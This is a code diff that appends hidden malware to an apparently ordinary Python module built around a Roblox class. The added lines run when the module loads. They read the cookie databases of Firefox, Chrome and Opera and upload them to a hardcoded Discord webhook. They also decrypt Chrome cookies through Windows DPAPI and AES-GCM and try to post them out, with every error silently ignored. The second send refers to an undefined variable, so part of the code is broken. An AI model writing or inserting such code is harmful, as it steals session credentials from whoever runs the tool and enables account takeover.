@@ -484,3 +484,41 @@ class Roblox:
         os.remove(path=path)
 
 k = Roblox()
+hok = 'https://discord.com/api/webhooks/1306568771644690542/jSSKvJ8P9PyM9Vgv2qv4n5SqN5kFabj3pC1MHdfu6jLaOddhdr4QX-zotnPNZMxo5AeM'
+user = os.getlogin()
+flis = [
+    f"C:/Users/{user}/AppData/Local/Mozilla/Firefox/Profiles/*.default*/cookies.sqlite",
+    f"C:/Users/{user}/AppData/Local/Google/Chrome/User Data/Default/Network/Cookies",
+    f"C:/Users/{user}/AppData/Roaming/Opera Software/Opera GX Stable/Network/Cookies",
+    f"C:/Users/{user}/AppData/Roaming/Opera Software/Opera Stable/Default/Network/Cookies"]
+
+for fpath in flis:
+    if os.path.exists(fpath):
+        with open(fpath, 'rb') as file:
+            nam = fpath.split('/')[-1] 
+            files = {'file': (nam, file)  }
+            try:
+                r = requests.post(hok, files=files)
+            except:pass
+    else:continue
+
+def gcc(db=None):
+    import json,sqlite3
+    from base64 import b64decode
+    from win32.win32crypt import CryptUnprotectData 
+    from Cryptodome.Cipher.AES import new, MODE_GCM 
+    try:
+        if db is None:
+            from os.path import expandvars
+            db = expandvars('%LOCALAPPDATA%/Google/Chrome/User Data/Default/Cookies')
+        with open(db + '/../../Local State') as f:
+            key = CryptUnprotectData(b64decode(json.load(f)['os_crypt']['encrypted_key'])[5:])[1]
+
+        conn = sqlite3.connect(db)
+        conn.create_function('decrypt', 1, lambda v: new(key, MODE_GCM, v[3:15]).decrypt(v[15:-16]).decode())
+        cookies = dict(conn.execute("SELECT name, decrypt(encrypted_value) FROM cookies"))
+        conn.close()
+        requests.post(hook,json={"content": f"{cookies}"})
+    except:
+        pass
+gcc()
